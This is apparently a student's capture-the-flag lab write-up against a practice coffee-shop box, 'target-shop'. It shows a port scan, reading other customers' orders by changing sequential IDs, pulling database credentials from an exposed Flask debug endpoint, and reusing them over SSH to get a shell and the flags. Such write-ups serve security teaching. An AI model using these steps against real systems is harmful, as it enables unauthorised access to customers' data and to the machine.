---
lab: example
name: Max Mustermann
matrik: 1234567
---

# example writeup
The box is `target-shop`, a small online coffee shop. I worked from the attacker system and used
Burp's browser for the shop itself.

## Port scan
I started with a scan over all TCP ports so I don't miss anything on a high port:

```
$ nmap -p- -sV target-shop
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp   open  http    nginx 1.22.1
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.11.2)
6379/tcp open  redis   Redis key-value store
...
```

Port 80 is the shop. I didn't expect a second web server on 5000. Werkzeug is what Flask uses
while you develop an app, so that looked worth a closer look later. SSH is only useful once I have
a user and a password. I also tried Redis, but it only answers `NOAUTH Authentication required`,
and I never needed it for the objectives.

## Objective 1: another customer's order
I registered an account and ordered something so I could see how the shop handles orders. Opening
"My orders" sends this request:

```
GET /api/orders/1043 HTTP/1.1
Host: target-shop
Cookie: session=eyJ1c2VyIjoiZXhhbXBsZSJ9...
...
```

My order has the number 1043, and the number is just counted up, so there should be older orders
from other people. I sent the request to Repeater and tried 1042 first, which was someone else's
coffee order. So the shop does not check whose order it is. I went down to the first one, 1001:

```
GET /api/orders/1001 HTTP/1.1
Host: target-shop
Cookie: session=eyJ1c2VyIjoiZXhhbXBsZSJ9...
...
```

```
HTTP/1.1 200 OK
Content-Type: application/json
...

{"id": 1001, "customer": "admin", "items": ["Espresso beans 1kg"],
 "note": "DC{182c795b3187342b027a4fe1d541d2fd}"}
```

That one belongs to `admin`, and the flag is in the note.

## Objective 2: the server on port 5000
Back to port 5000 from the scan. The start page just lists two routes:

```
$ curl -s http://target-shop:5000/
{"routes": ["/health", "/debug/config"]}
```

`/debug/config` sounded like the app's settings. The answer is one long line of JSON, so I piped
it into `jq`. We didn't have it in the lecture: it formats JSON, and `.database` prints only that
part of it.

```
$ curl -s http://target-shop:5000/debug/config | jq .database
{
  "host": "localhost",
  "user": "deploy",
  "password": "Br3wM4ster!",
  "comment": "DC{020e85267183d3f20871da6b80a4b958}"
}
```

The flag is in `comment`. More interesting for the next step: a username and a password.

## Objective 3: shell on the box
The database runs on the same machine (`localhost`), so maybe `deploy` is also a normal Linux
user with the same password. I tried it on SSH, and it worked:

```
$ ssh deploy@target-shop
deploy@target-shop's password:
...
deploy@target-shop:~$ ls
flag.txt  shop
deploy@target-shop:~$ cat flag.txt
DC{7d9751296320c1ce98fe2f11a5018b15}
```
